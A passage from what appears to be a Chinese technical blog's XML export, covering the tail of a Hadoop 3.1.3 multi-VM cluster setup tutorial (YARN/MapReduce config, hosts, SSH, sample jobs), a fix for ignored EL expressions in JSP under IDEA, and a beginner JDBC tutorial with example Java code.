class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>/opt/bigdata/hadoop-3.1.3/share/hadoop/mapreduce/*, /opt/bigdata/hadoop-3.1.3/share/hadoop/mapreduce/lib/*<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>mapreduce.map.memory.mb<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>1500<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>每个Map任务的物理内存限制<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>mapreduce.reduce.memory.mb<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>3000<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>每个Reduce任务的物理内存限制<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>mapreduce.map.java.opts<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>-Xmx1200m<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>mapreduce.reduce.java.opts<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>-Xmx2600m<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="5-配置yarn-site-xml"><a href="#5-配置yarn-site-xml" class="headerlink" title="(5) 配置yarn-site.xml"></a>(5) 配置yarn-site.xml</h2><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.resourcemanager.hostname<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>master<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">description</span>&gt;</span>指定resourcemanager所在的hostname<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.nodemanager.aux-services<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>mapreduce_shuffle<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">description</span>&gt;</span>NodeManager上运行的附属服务。需配置成mapreduce_shuffle，才可运行 MapReduce程序<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.log-aggregation-enable<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>false<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.nodemanager.resource.memory-mb<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>22528<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">discription</span>&gt;</span>每个节点可用内存,单位MB<span class="tag">&lt;/<span class="name">discription</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.scheduler.minimum-allocation-mb<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>1500<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">discription</span>&gt;</span>单个任务可申请最少内存，默认1024MB<span class="tag">&lt;/<span class="name">discription</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.scheduler.maximum-allocation-mb<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>16384<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">discription</span>&gt;</span>单个任务可申请最大内存，默认8192MB<span class="tag">&lt;/<span class="name">discription</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="6-配置slavers"><a href="#6-配置slavers" class="headerlink" title="(6) 配置slavers"></a>(6) 配置slavers</h2><p>如果没有配置hosts，必须输入相应主机的ip地址，这里可以先填主机名，后面会配置hosts，hadoop会把配置在这里的主机当作datanode。hadoop3.0以后slaves更名为workers了，所以我们使用如下命令：</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">vi workers</span></span><br></pre></td></tr></table></figure>
<p>删除</p>
<p>localhost</p>
<p>增加</p>
<p>node1</p>
<p>node2</p>
<p>node3</p>
<h2 id="7-修改start-dfs-sh等文件"><a href="#7-修改start-dfs-sh等文件" class="headerlink" title="(7) 修改start-dfs.sh等文件"></a>(7) 修改start-dfs.sh等文件</h2><p>需要进入hadoop安装目录下的sbin文件夹</p>
<p>1.对于start-dfs.sh和stop-dfs.sh文件，添加下列参数：</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">HDFS_DATANODE_USER</span>=root  </span><br><span class="line"><span class="attr">HDFS_DATANODE_SECURE_USER</span>=hdfs  </span><br><span class="line"><span class="attr">HDFS_NAMENODE_USER</span>=root  </span><br><span class="line"><span class="attr">HDFS_SECONDARYNAMENODE_USER</span>=root </span><br></pre></td></tr></table></figure>
<p><a href="https://imgchr.com/i/rPQnaQ"><img src="https://s3.ax1x.com/2020/12/09/rPQnaQ.jpg" alt="rPQnaQ.jpg"></a></p>
<p>2.同样地，对于start-yarn.sh和stop-yarn.sh文件，添加下列参数：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env bash</span></span><br><span class="line">YARN_RESOURCEMANAGER_USER=root</span><br><span class="line">HADOOP_SECURE_DN_USER=yarn</span><br><span class="line">YARN_NODEMANAGER_USER=root</span><br></pre></td></tr></table></figure>
<h1 id="3-克隆虚拟机"><a href="#3-克隆虚拟机" class="headerlink" title="3.克隆虚拟机"></a>3.克隆虚拟机</h1><font color="ff0000">这里建议先使用以下vmware快照，在继续往下进行</font>

<p>首先先关闭防火墙，再使用vmware的克隆功能，完整克隆master</p>
<figure class="highlight gauss"><table><tr><td class="code"><pre><span class="line">systemctl status firewalld.service 		  <span class="meta">#查看防火墙状态</span></span><br><span class="line"></span><br><span class="line">systemctl <span class="keyword">stop</span> firewalld.service	 	  <span class="meta">#关闭防火墙</span></span><br><span class="line"></span><br><span class="line">systemctl <span class="keyword">disable</span> firewalld.service 	  <span class="meta">#禁止防火墙</span></span><br></pre></td></tr></table></figure>
<h1 id="4-修改虚拟机host"><a href="#4-修改虚拟机host" class="headerlink" title="4.修改虚拟机host"></a>4.修改虚拟机host</h1><h2 id="1-更改各主机名字"><a href="#1-更改各主机名字" class="headerlink" title="(1) 更改各主机名字"></a>(1) 更改各主机名字</h2><p>为了能够更方便的识别主机，将四台虚拟机的名字分别修改为master、node1、node2、node3</p>
<p>注意切换到root账户下</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">vi <span class="regexp">/etc/</span>hostname  <span class="comment">#编程hostname配置文件</span></span><br></pre></td></tr></table></figure>
<p><a href="https://imgchr.com/i/rPQ1x0"><img src="https://s3.ax1x.com/2020/12/09/rPQ1x0.jpg" alt="rPQ1x0.jpg"></a></p>
<p>点击Esc，再:wq保存退出</p>
<p>另外三个虚拟机同样操作更改名字</p>
<h2 id="2-开启主机的DHCP模式，自动获取ip地址"><a href="#2-开启主机的DHCP模式，自动获取ip地址" class="headerlink" title="(2) 开启主机的DHCP模式，自动获取ip地址"></a>(2) 开启主机的DHCP模式，自动获取ip地址</h2><font color="ff0000">不建议使用这个方法，使用静态IP配置的方法参考以下链接，动态IP的地址会改变，hosts文件得重新配置</font>

<p><a href="https://blog.csdn.net/weixin_42792088/article/details/107139833?utm_medium=distribute.pc_relevant.none-task-blog-baidulandingword-2&amp;spm=1001.2101.3001.4242">https://blog.csdn.net/weixin_42792088/article/details/107139833?utm_medium=distribute.pc_relevant.none-task-blog-baidulandingword-2&amp;spm=1001.2101.3001.4242</a></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">vi <span class="regexp">/etc/</span>sysconfig<span class="regexp">/network-scripts/i</span>fcfg-ens33</span><br></pre></td></tr></table></figure>
<p><a href="https://imgchr.com/i/rPQGrT"><img src="https://s3.ax1x.com/2020/12/09/rPQGrT.jpg" alt="rPQGrT.jpg"></a></p>
<p>重启网卡</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">service<span class="built_in"> network </span>restart</span><br></pre></td></tr></table></figure>
<p>在四台虚拟机中分别进行以上操作</p>
<p>之后输入ip addr，记下四个虚拟机的ip地址</p>
<p><a href="https://imgchr.com/i/rPQ8MV"><img src="https://s3.ax1x.com/2020/12/09/rPQ8MV.jpg" alt="rPQ8MV.jpg"></a></p>
<div class="table-container">
<table>
<thead>
<tr>
<th>主机名</th>
<th>ip地址</th>
</tr>
</thead>
<tbody>
<tr>
<td>master</td>
<td>192.168.136.131</td>
</tr>
<tr>
<td>node1</td>
<td>192.168.136.133</td>
</tr>
<tr>
<td>node2</td>
<td>192.168.136.134</td>
</tr>
<tr>
<td>node3</td>
<td>192.168.136.135</td>
</tr>
</tbody>
</table>
</div>
<h2 id="3-配置hosts"><a href="#3-配置hosts" class="headerlink" title="(3) 配置hosts"></a>(3) 配置hosts</h2><p>在每台虚拟机上</p>
<p>配置hosts主要是为了让机器能够相互识别</p>
<p><em>注：hosts文件是域名分析文件，在hosts文件内配置了ip地址和主机名的对应关系，配置之后，通过主机名，电脑就可以定位到相应的ip地址</em></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">vi <span class="regexp">/etc/</span>hosts</span><br></pre></td></tr></table></figure>
<p>在hosts文件中输入一下内容：</p>
<p><a href="https://imgchr.com/i/rPQZqS"><img src="https://s3.ax1x.com/2020/12/09/rPQZqS.jpg" alt="rPQZqS.jpg"></a></p>
<font color="ff0000">注意要与实际ip和主机名对应</font>

<h2 id="4-SSH配置"><a href="#4-SSH配置" class="headerlink" title="(4) SSH配置"></a>(4) SSH配置</h2><figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">ssh-keygen</span></span><br></pre></td></tr></table></figure>
<p>ssh一路回车</p>
<p><a href="https://imgchr.com/i/rPQMPs"><img src="https://s3.ax1x.com/2020/12/09/rPQMPs.jpg" alt="rPQMPs.jpg"></a></p>
<p>使用如下命令将公钥复制到node1、node2和node3节点中：</p>
<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">ssh-<span class="keyword">copy</span>-<span class="built_in">id</span> root@node1</span><br><span class="line">ssh-<span class="keyword">copy</span>-<span class="built_in">id</span> root@node2</span><br><span class="line">ssh-<span class="keyword">copy</span>-<span class="built_in">id</span> root@node3</span><br></pre></td></tr></table></figure>
<p><a href="https://imgchr.com/i/rPQQGn"><img src="https://s3.ax1x.com/2020/12/09/rPQQGn.jpg" alt="rPQQGn.jpg"></a></p>
<p>在master节点下输入试实验是否能免密登陆，第一次登陆可能需要输入密码</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">ssh</span> node<span class="number">1</span></span><br><span class="line"><span class="attribute">ssh</span> node<span class="number">2</span></span><br><span class="line"><span class="attribute">ssh</span> node<span class="number">3</span></span><br></pre></td></tr></table></figure>
<h1 id="5-检查hadoop运行情况"><a href="#5-检查hadoop运行情况" class="headerlink" title="5.检查hadoop运行情况"></a>5.检查hadoop运行情况</h1><font color="ff0000">在master节点下执行以下操作</font>

<p>1.格式化namenode</p>
<p>第一次启动集群，在master虚拟机的hadoop-3.1.3目录下执行</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">bin</span>/hdfs namenode -<span class="built_in">format</span></span><br></pre></td></tr></table></figure>
<p>如果多次格式化会出现错误，参考这篇文章<a href="https://blog.csdn.net/qq_41059374/article/details/80695581">https://blog.csdn.net/qq_41059374/article/details/80695581</a></p>
<p>2.启动</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">start</span>-<span class="keyword">all</span>.sh</span><br></pre></td></tr></table></figure>
<p>3.检查进程</p>
<p>master</p>
<p><a href="https://imgchr.com/i/rPQVr8"><img src="https://s3.ax1x.com/2020/12/09/rPQVr8.jpg" alt="rPQVr8.jpg"></a></p>
<p>node1</p>
<p><a href="https://imgchr.com/i/rPQF2t"><img src="https://s3.ax1x.com/2020/12/09/rPQF2t.jpg" alt="rPQF2t.jpg"></a></p>
<p>node2</p>
<p><a href="https://imgchr.com/i/rPQi8I"><img src="https://s3.ax1x.com/2020/12/09/rPQi8I.jpg" alt="rPQi8I.jpg"></a></p>
<p>node3</p>
<p>20</p>
<ol>
<li>进入管理页面</li>
</ol>
<p>在浏览器地址栏中输入以下命令</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>界面</th>
<th>地址</th>
</tr>
</thead>
<tbody>
<tr>
<td>管理页面</td>
<td><a href="http://localhost:8088">http://localhost:8088</a></td>
</tr>
<tr>
<td>NameNode界面</td>
<td><a href="http://localhost:9870">http://localhost:9870</a></td>
</tr>
</tbody>
</table>
</div>
<p><a href="https://imgchr.com/i/rPQu5j"><img src="https://s3.ax1x.com/2020/12/09/rPQu5j.jpg" alt="rPQu5j.jpg"></a></p>
<p><a href="https://imgchr.com/i/rPQmVg"><img src="https://s3.ax1x.com/2020/12/09/rPQmVg.jpg" alt="rPQmVg.jpg"></a></p>
<h1 id="6-Hadoop运行实例"><a href="#6-Hadoop运行实例" class="headerlink" title="6.Hadoop运行实例"></a>6.Hadoop运行实例</h1><h2 id="1-运行wordcount"><a href="#1-运行wordcount" class="headerlink" title="(1) 运行wordcount"></a>(1) 运行wordcount</h2><p>进入hadoop-3.1.3目录</p>
<p>(1) 创建Input文件夹</p>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line"># hdfs dfs -<span class="keyword">mkdir</span> /<span class="keyword">Input</span></span><br></pre></td></tr></table></figure>
<p>(2) 将hadoop-3.1.3下已经存在的LICENSE.txt文件上传到hdfs的/Input目录下</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line"># hdfs dfs -put <span class="module-access"><span class="module"><span class="identifier">LICENSE</span>.</span></span>txt /Input</span><br></pre></td></tr></table></figure>
<p>查看已经上传成功</p>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">hdfs dfs -<span class="keyword">ls</span> /<span class="keyword">Input</span></span><br></pre></td></tr></table></figure>
<p><a href="https://imgchr.com/i/rPQEKf"><img src="https://s3.ax1x.com/2020/12/09/rPQEKf.jpg" alt="rPQEKf.jpg"></a></p>
<p>(3) 运行hadoop安装包中自带的wordcount程序</p>
<p>运行share/hadoop/mapreduce/hadoop-mapreduce-examples-3.1.3.jar这个java程序，调用wordcount方法</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"># hadoop jar share<span class="regexp">/hadoop/m</span>apreduce<span class="regexp">/hadoop-mapreduce-examples-3.1.3.jar wordcount /I</span>nput<span class="regexp">/LICENSE.txt /I</span>nput/Output</span><br></pre></td></tr></table></figure>
<p><a href="https://imgchr.com/i/rPr5qg"><img src="https://s3.ax1x.com/2020/12/10/rPr5qg.jpg" alt="rPr5qg.jpg"></a></p>
<p>(4) 查看云端的/Output/part-r-00000文件</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">hdfs dfs -cat <span class="regexp">/Output/</span>part-r-<span class="number">00000</span></span><br></pre></td></tr></table></figure>
<p><a href="https://imgchr.com/i/rPrRRP"><img src="https://s3.ax1x.com/2020/12/10/rPrRRP.jpg" alt="rPrRRP.jpg"></a></p>
<h2 id="2-计算PI的值"><a href="#2-计算PI的值" class="headerlink" title="(2) 计算PI的值"></a>(2) 计算PI的值</h2><p>start-all.sh启动集群后</p>
<font color="ff0000">进入hadoop-3.1.3的目录</font>

<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">hadoop</span> jar share/hadoop/mapreduce/hadoop-mapreduce-examples-<span class="number">3</span>.<span class="number">1</span>.<span class="number">3</span>.jar pi <span class="number">1</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>Hadoop计算PI的方法属于是采用大量采样的统计学方法，还是属于数据密集型的工作，如果最后两个1改的越大，计算的越慢，但是结果越准确。</p>
<p><a href="https://imgchr.com/i/rPrhM8"><img src="https://s3.ax1x.com/2020/12/10/rPrhM8.jpg" alt="rPrhM8.jpg"></a></p>
<p><a href="https://imgchr.com/i/rPrWxf"><img src="https://s3.ax1x.com/2020/12/10/rPrWxf.jpg" alt="rPrWxf.jpg"></a></p>
]]></content>
      <categories>
        <category>环境搭建</category>
      </categories>
  </entry>
  <entry>
    <title>IDEA使用$符号失效问题</title>
    <url>/post/7fbc5666.html</url>
    <content><![CDATA[<p>　　今天在使用IDEA开发maven项目的时候遇到不加载EL表达式的问题<span id="more"></span><br><img src="https://s3.ax1x.com/2020/12/15/rMuP41.png" alt="rMuP41.png">]</p>
<p>结果却显示为</p>
<p><img src="https://s3.ax1x.com/2020/12/15/rMuF9x.png" alt="rMuF9x.png">]</p>
<font color="ff0000">解决办法</font>

<p>在jsp开头添加</p>
<figure class="highlight erb"><table><tr><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%</span></span></span><span class="ruby">@page isELIgnored=<span class="string">&quot;false&quot;</span></span><span class="xml"><span class="tag">%&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>isELIgnored是指是否忽略EL表达式</p>
<p>之所以形成这种问题，是因为JSP2.0以上isELIgnored默认是true</p>
<p>isELIgnored 属性JSP 2.0 新引入的属性，在只支持 JSP 1.2  及早期版本的服务器中，使用这项属性是不合法的。这个属性的默认值依赖于 Web 应用所使用的 web.xml 的版本。如果 web.xml 指定  servlet 2.3（对应JSP 1.2）或更早版本，默认值为 true（但变更默认值依旧是合法的，JSP 2.0  兼容的服务器中都允许使用这项属性，不管 web.xml 的版本如何）</p>
<p>查看Servlet版本</p>
<p>打开web.xml文件就可以看到</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">web-app</span> <span class="meta-keyword">PUBLIC</span></span></span><br><span class="line"><span class="meta"> <span class="meta-string">&quot;-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN&quot;</span></span></span><br><span class="line"><span class="meta"> <span class="meta-string">&quot;http://java.sun.com/dtd/web-app_2_3.dtd&quot;</span> &gt;</span></span><br></pre></td></tr></table></figure>
<p>按住Ctrl点击链接，到78行左右就可以看到一段注释</p>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">This is the XML DTD <span class="keyword">for</span> the Servlet <span class="number">2.3</span> deployment descriptor.</span><br><span class="line">All Servlet <span class="number">2.3</span> deployment descriptors must include a DOCTYPE</span><br><span class="line">of the following form:</span><br><span class="line"> &lt;!DOCTYPE web-app PUBLIC</span><br><span class="line">  <span class="string">&quot;-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN&quot;</span></span><br><span class="line">  <span class="string">&quot;http://java.sun.com/dtd/web-app_2_3.dtd&quot;</span>&gt;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>
<p>翻译一下就是</p>
<p>“这是Servlet 2.3部署描述符的XML DTD。所有的Servlet 2.3部署描述符必须包含于下面的DOCTYPE”<br> 很明显这就是Servlet 2.3版本</p>
<p>所以</p>
<p>isELIgnored的属性默认为true</p>
]]></content>
      <categories>
        <category>工具使用问题</category>
      </categories>
      <tags>
        <tag>IDEA使用问题</tag>
      </tags>
  </entry>
  <entry>
    <title>JDBC使用</title>
    <url>/post/b6296e7c.html</url>
    <content><![CDATA[<p>　　全称为：Java Data Base Connectivity（java数据库连接），可以为多种数据库提供填统一的访问。JDBC是sun开打的一套数据库访问编程接口。<span id="more"></span></p>
<h1 id="JDBC的主要功能"><a href="#JDBC的主要功能" class="headerlink" title="JDBC的主要功能"></a>JDBC的主要功能</h1><ul>
<li>建立与数据库或者其他数据源的连接</li>
<li>向数据库发送SQL命令</li>
<li>处理数据库的返回结果</li>
</ul>
<h1 id="JDBC中常用类和接口"><a href="#JDBC中常用类和接口" class="headerlink" title="JDBC中常用类和接口"></a>JDBC中常用类和接口</h1><h2 id="1-连接到数据库（Connection）"><a href="#1-连接到数据库（Connection）" class="headerlink" title="1.连接到数据库（Connection）"></a>1.连接到数据库（Connection）</h2><p>Connection对象代表与数据库的连接。连接过程包括所执行的SQL语句和在改连接上所返回的结果。一个应用程序可与单个数据库有一个或多个连接，或者可与很多数据库有链接。打开连接与数据库建立连接的标准方法是调用DriverManager.getConnection()方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String url=<span class="string">&quot;jdbc:mysql://127.0.0.1:3306/bjpowernode&quot;</span>;</span><br><span class="line"></span><br><span class="line">String user=<span class="string">&quot;root&quot;</span>;</span><br><span class="line"></span><br><span class="line">String password=<span class="string">&quot;root&quot;</span>;</span><br><span class="line"></span><br><span class="line">DriverManager.getConnection(url,user,password);</span><br></pre></td></tr></table></figure>
<h2 id="2-建立操作指令（Statement）"><a href="#2-建立操作指令（Statement）" class="headerlink" title="2.建立操作指令（Statement）"></a>2.建立操作指令（Statement）</h2><p>Statement对象用于将SQL语句发送到数据库中。实际上有三种Statement对象，他们都作为在给定连接上执行SQL语句的包容器：Statement、PreparedStatement（继承Statement）和CallableStatement（继承PreparedStatement）。他们都用于发送特定类型的SQL语句：</p>
<p>（1）Statement对象用于执行不带参数的简单的SQL语句；Statement接口提供了执行语句和获取结果的基本方法。</p>
<p>（2）PreparedStatement对象用于执行带或不带IN参数的预编译SQL语句；PreparedStatement接口添加处理IN参数的方法。</p>
<p>（3）CallableStatement对象用于执行对数据库已存储过程的调用；CallableStatement添加处理OUT参数的方法。</p>
<p><strong>Statement提供了许多方法，最常用的方法如下：</strong></p>
<div class="table-container">
<table>
<thead>
<tr>
<th>方法</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>execute()</td>
<td>运行语句，返回是否有结果集</td>
</tr>
<tr>
<td>executeQuery()</td>
<td>运行查询（select）语句，返回ResultSet对象</td>
</tr>
<tr>
<td>executeUpdata()</td>
<td>运行更新（update/insert/delete）语句，返回更新的行数</td>
</tr>
<tr>
<td>addBatch()</td>
<td>增加批处理语句</td>
</tr>
<tr>
<td>executeBatch()</td>
<td>执行批处理语句</td>
</tr>
<tr>
<td>clearBatch()</td>
<td>清楚批处理语句</td>
</tr>
</tbody>
</table>
</div>
<h2 id="3-结果集合类（ResultSet）"><a href="#3-结果集合类（ResultSet）" class="headerlink" title="3.结果集合类（ResultSet）"></a>3.结果集合类（ResultSet）</h2><p>ResultSet包含符合SQL语句中条件的所有行记录，并且它通过一套get方法提供了对这些行中数据的访问。ResultSet.next()方法用于移动到ResultSet中的下一行，使下一行成为当前行。</p>
<h1 id="JDBC编程步骤"><a href="#JDBC编程步骤" class="headerlink" title="JDBC编程步骤"></a>JDBC编程步骤</h1><h2 id="1-加载驱动程序：Class-forName-DriverClass"><a href="#1-加载驱动程序：Class-forName-DriverClass" class="headerlink" title="1.加载驱动程序：Class.forName(DriverClass)"></a>1.加载驱动程序：Class.forName(DriverClass)</h2><p>加载mysql驱动：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>)</span><br></pre></td></tr></table></figure>
<font color="ff0000">注意mysql8.0以上版本的是:</font> com.mysql.cj.jdbc.Driver

## 2.获得数据库链接：DriverManager.gerConnection()

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">DriverManager.getConnection(<span class="string">&quot;jdbc:mysql://localhost:3306/bjpowernode?useUnicode=true&amp;characterEncoding=utf-8&amp;useSSL=false&amp;serverTimezone=GMT%2B8&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root&quot;</span>);</span><br></pre></td></tr></table></figure>

## 3.创建Statement对象：conn.createStatement()

## 4.向数据库发送SQL命令，执行SQL语句

## 5.处理查询结果集（只有第四步执行select语句，才有这一步）

## 6.释放资源（java和数据库之间的通信，一定关闭）

# 代码实例演示

## 1.编程步骤的具体代码

<font color="ff0000">我的mysql版本是8.0，注意5.0版本和8.0版本之间的变化</font>

<hr>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.sql.DriverManager;</span><br><span class="line"><span class="keyword">import</span> java.sql.ResultSet;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"><span class="keyword">import</span> java.sql.Statement;</span><br><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"><span class="keyword">import</span> java.sql.DriverManager;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">javaTest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, SQLException  </span>&#123;</span><br><span class="line">        String URL=<span class="string">&quot;jdbc:mysql://127.0.0.1:3306/imooc?useUnicode=true&amp;characterEncoding=utf-8&quot;</span>;</span><br><span class="line">        String USER=<span class="string">&quot;root&quot;</span>;</span><br><span class="line">        String PASSWORD=<span class="string">&quot;tiger&quot;</span>;</span><br><span class="line">        <span class="comment">//1.加载驱动程序</span></span><br><span class="line">        Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);</span><br><span class="line">        <span class="comment">//2.获得数据库链接</span></span><br><span class="line">        Connection conn=DriverManager.getConnection(URL, USER, PASSWORD);</span><br><span class="line">        <span class="comment">//3.通过数据库的连接操作数据库，实现增删改查（使用Statement类）</span></span><br><span class="line">        Statement st=conn.createStatement();</span><br><span class="line">        ResultSet rs=st.executeQuery(<span class="string">&quot;select * from user&quot;</span>);</span><br><span class="line">        <span class="comment">//4.处理数据库的返回结果(使用ResultSet类)</span></span><br><span class="line">        <span class="keyword">while</span>(rs.next())&#123;</span><br><span class="line">            System.out.println(rs.getString(<span class="string">&quot;user_name&quot;</span>)+<span class="string">&quot; &quot;</span></span><br><span class="line">                          +rs.getString(<span class="string">&quot;user_password&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//关闭资源</span></span><br><span class="line">        rs.close();</span><br><span class="line">        st.close();</span><br><span class="line">        conn.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
